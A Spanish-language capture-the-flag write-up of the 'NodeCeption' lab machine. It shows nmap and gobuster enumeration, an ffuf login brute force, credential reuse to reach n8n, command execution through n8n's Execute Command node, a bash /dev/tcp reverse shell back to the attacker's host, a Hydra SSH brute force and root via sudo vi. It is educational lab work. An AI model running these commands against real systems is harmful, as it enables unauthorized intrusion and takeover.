# 🐉 Writeup — Máquina NodeCeption
**Plataforma:** The Hackers Labs  
**Dificultad:** Principiante  
**Fecha:** 2026-03-21  
**Estado:** Completada ✅

---

## 🗺️ Resumen

NodeCeption es una máquina Linux que combina varias técnicas fundamentales de hacking: enumeración web, fuerza bruta de formularios, reutilización de credenciales, ejecución remota de comandos mediante una aplicación de automatización (n8n) y escalada de privilegios a través de sudo mal configurado con el editor vi.

**Conceptos cubiertos:** TCP/UDP · Nmap · Gobuster · ffuf · Information Disclosure · RCE · Reverse Shell · Hydra · GTFOBins · Sudo Privilege Escalation

---

## 🔍 1. Reconocimiento

### Escaneo de puertos (Nmap)

```bash
nmap -p- --open -sCV -Pn -n --min-rate 5000 192.168.0.18
```

**Desglose del comando:**
- `-p-` → escanea los 65535 puertos existentes
- `--open` → muestra solo los puertos abiertos
- `-sC` → ejecuta scripts básicos de reconocimiento
- `-sV` → detecta versiones de los servicios
- `-Pn` → no hace ping previo (evita falsos negativos por firewall)
- `-n` → sin resolución DNS (más rápido)
- `--min-rate 5000` → mínimo 5000 paquetes por segundo

**Puertos detectados:**

| Puerto | Estado | Servicio | Versión |
|--------|--------|----------|---------|
| 22/tcp | open | SSH | OpenSSH 9.6p1 Ubuntu |
| 5678/tcp | open | HTTP (n8n) | Aplicación web moderna (JS) |
| 8765/tcp | open | HTTP | Apache httpd 2.4.58 (Ubuntu) |

**Análisis inicial:**
- **Puerto 22 (SSH):** Versión moderna, difícil de explotar directamente. Posible vector si encontramos credenciales.
- **Puerto 8765 (Apache):** Servidor web estándar. Primer objetivo de enumeración.
- **Puerto 5678:** Nmap no reconoció el servicio (`rrac?`) pero el HTML devuelto revela una aplicación JavaScript moderna. El nombre de la máquina "NodeCeption" sugiere Node.js — confirmado más tarde como **n8n**, una herramienta de automatización de workflows.

---

## 🌐 2. Enumeración Web

### Análisis del servicio Apache (puerto 8765)

Al acceder a `http://192.168.0.18:8765` encontramos la página genérica de Apache. Sin embargo, al revisar el **código fuente** (Clic derecho → Ver código fuente) encontramos un hallazgo crítico:

```html
<!-- usuario@maildelctf.com Espero que hayas cambiado la contraseña como se te indicó. 
Recuerda: mínimo 8 caracteres, al menos 1 número y 1 mayúscula. -->
```

**Información extraída (Information Disclosure):**
- ✅ Usuario válido: `usuario@maildelctf.com`
- ✅ Política de contraseñas conocida: mínimo 8 caracteres, al menos 1 número y 1 mayúscula
- ✅ Indicio de que la contraseña podría no haber sido cambiada

### Fuzzing de directorios (Gobuster)

```bash
gobuster dir -u http://192.168.0.18:8765 \
  -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt \
  -x php,html,txt
```

**Desglose del comando:**
- `dir` → modo de enumeración de directorios
- `-u` → URL objetivo
- `-w` → wordlist a usar
- `-x php,html,txt` → busca también archivos con estas extensiones

**Resultados:**

| Ruta | Código | Tamaño |
|------|--------|--------|
| /index.html | 200 | 10833 |
| /login.php | 200 | 1723 |
| /server-status | 403 | 279 |

**Análisis de códigos HTTP:**
- `200` → el recurso existe y es accesible
- `403 Forbidden` → el recurso existe pero el servidor nos prohíbe el acceso
- `404` → el recurso no existe (no apareció ninguno)

El hallazgo más relevante es `/login.php` — un panel de autenticación que pide correo y contraseña. Tenemos el correo del paso anterior. Solo nos falta la contraseña.

---

## 🔓 3. Acceso Inicial

### Fuerza bruta del formulario web (ffuf)

Antes de lanzar el ataque, necesitamos conocer el tamaño de la respuesta cuando el login **falla**, para poder filtrarla. Lanzamos ffuf sin filtro unos segundos para observarlo:

```bash
ffuf -w /usr/share/wordlists/rockyou.txt -X POST \
  -d "email=usuario@maildelctf.com&password=FUZZ" \
  -u http://192.168.0.18:8765/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc all
```

Observamos que todas las respuestas fallidas tienen tamaño **1808**. Añadimos el filtro `-fs 1808` y relanzamos:

```bash
ffuf -w /usr/share/wordlists/rockyou.txt -X POST \
  -d "email=usuario@maildelctf.com&password=FUZZ" \
  -u http://192.168.0.18:8765/login.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc all -fs 1808
```

**Desglose del comando:**
- `-X POST` → método HTTP POST (el que usan los formularios)
- `-d` → datos del formulario. `FUZZ` marca dónde se insertan las contraseñas
- `-H` → cabecera HTTP necesaria para formularios
- `-mc all` → captura todos los códigos de respuesta
- `-fs 1808` → filtra respuestas de tamaño 1808 (los fallos)

**Credenciales encontradas:**
```
usuario@maildelctf.com : Password1
```

La contraseña cumple exactamente la política encontrada en el código fuente: 9 caracteres, número (`1`), mayúscula (`P`). El usuario nunca cambió la contraseña por defecto.

### Reutilización de credenciales en n8n

Al acceder al panel web con las credenciales obtenidas, el mensaje de confirmación indica literalmente:

> *"Ahora puedes iniciar sesión en n8n usando este mismo usuario y contraseña"*

Accedemos a `http://192.168.0.18:5678` y usamos las mismas credenciales — acceso concedido. Este es un ejemplo clásico de **reutilización de credenciales**.

---

## 💥 4. Ejecución Remota de Comandos (RCE)

### Explotación de n8n — Execute Command

n8n es una herramienta de automatización de workflows que permite crear flujos con diferentes nodos. Uno de esos nodos es **Execute Command**, que ejecuta comandos directamente en el sistema donde corre el servidor.

**Pasos:**
1. Workflows → New Workflow
2. Añadir nodo → buscar "Execute Command"
3. Introducir comando: `whoami`
4. Ejecutar el nodo

**Resultado:**
```
stdout: thl
exitCode: 0
```

Confirmamos RCE como usuario `thl`.

### Reverse Shell

Con ejecución de comandos confirmada, establecemos una reverse shell para tener acceso interactivo.

**En nuestra máquina Kali** — ponemos netcat a escuchar:
```bash
nc -nlvp 4444
```

**En el nodo Execute Command de n8n:**
```bash
bash -c 'bash -i >& /dev/tcp/192.168.0.21/4444 0>&1'
```

Este comando hace que el servidor víctima abra una bash y la redirija hacia nuestra IP y puerto — donde netcat está esperando la conexión.

**Shell obtenida:**
```
thl@nodeception:~$
```

### Flag de usuario

```bash
cat /home/thl/user.txt
```

```
THL_wdYkVpXlqNaEUhRJfzbtHm
```

---

## 👑 5. Escalada de Privilegios

### Enumeración de permisos sudo

```bash
sudo -l
```

**Resultado:**
```
User thl may run the following commands on nodeception:
    (ALL) NOPASSWD: /usr/bin/vi
    (ALL : ALL) ALL
```

El usuario `thl` puede ejecutar `vi` como root **sin contraseña**. Sin embargo, al intentarlo desde la reverse shell, nos pide contraseña igualmente — la shell básica tiene limitaciones.

### Fuerza bruta SSH (Hydra)

Necesitamos la contraseña real del usuario `thl` para conectarnos por SSH y obtener una shell completa. Aprovechamos que el puerto 22 está abierto:

```bash
hydra -l thl -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.18
```

**Desglose del comando:**
- `-l thl` → usuario concreto (minúscula = un solo usuario)
- `-P` → wordlist de contraseñas (mayúscula = lista)
- `ssh://192.168.0.18` → protocolo y objetivo

**Credenciales encontradas:**
```
thl : basketball
```

### Acceso por SSH

```bash
ssh thl@192.168.0.18
```

Contraseña: `basketball`

### Escalada mediante vi (GTFOBins)

Con una shell completa y estable vía SSH:

```bash
sudo /usr/bin/vi
```

Dentro de vi ejecutamos:
```
:!/bin/bash
```

**¿Por qué funciona?** Vi permite ejecutar comandos del sistema con `:!comando`. Como vi se ejecuta con permisos de root (por la configuración de sudo), cualquier comando lanzado desde dentro también se ejecuta como root. Esta técnica está documentada en **GTFOBins** (`gtfobins.github.io`).

**Shell obtenida:**
```
root@nodeception:/home/thl#
```

### Flag de root

```bash
cat /root/root.txt
```

```
THL_QzXeoMuYRcJtWHabnLKfgDi
```

---

## 📊 6. Resumen del ataque

| Fase | Acción | Herramienta | Resultado |
|------|--------|-------------|-----------|
| Reconocimiento | Escaneo de puertos | Nmap | Puertos 22, 5678, 8765 |
| Enumeración | Análisis código fuente | Navegador | Email + política de contraseñas |
| Enumeración | Fuzzing de directorios | Gobuster | /login.php |
| Acceso inicial | Fuerza bruta formulario | ffuf | usuario@maildelctf.com : Password1 |
| Acceso inicial | Reutilización credenciales | Manual | Acceso a n8n |
| Ejecución | Remote Code Execution | n8n | Shell como thl |
| Post-explotación | User flag | cat | THL_wdYkVpXlqNaEUhRJfzbtHm |
| Escalada | Fuerza bruta SSH | Hydra | thl : basketball |
| Escalada | Sudo + vi (GTFOBins) | vi | Shell como root |
| Post-explotación | Root flag | cat | THL_QzXeoMuYRcJtWHabnLKfgDi |

---

## 🧠 7. Lecciones aprendidas

**Vulnerabilidades explotadas:**
- **Information Disclosure:** credenciales y política de contraseñas expuestas en comentarios HTML
- **Weak Password Policy:** contraseña predecible que cumple los mínimos pero es fácilmente bruteforceable
- **Credential Reuse:** mismas credenciales válidas en dos servicios distintos
- **RCE via n8n:** panel de automatización accesible sin restricciones de red
- **Sudo Misconfiguration:** vi con permisos NOPASSWD permite escapar a shell root

**Patrones para el futuro:**
1. Siempre revisar el código fuente de las páginas web — los comentarios son una mina de información
2. Cuando encuentres un formulario de login con usuario conocido → fuerza bruta con ffuf
3. Las credenciales encontradas en un servicio siempre probarlas en todos los demás (reutilización)
4. Cualquier binario en `sudo -l` debe consultarse en GTFOBins
5. n8n, Jenkins, Rundeck y similares herramientas de automatización con acceso a "Execute Command" son vectores de RCE directos

---

*Writeup realizado como parte del proceso de aprendizaje autodidacta en ciberseguridad.*  
*Perfil GitHub: [github.com/HaRoldCant](https://github.com/HaRoldCant)*
